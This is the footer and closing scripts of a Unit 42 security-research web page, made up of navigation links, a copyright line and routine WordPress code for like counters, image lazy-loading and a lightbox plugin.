<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
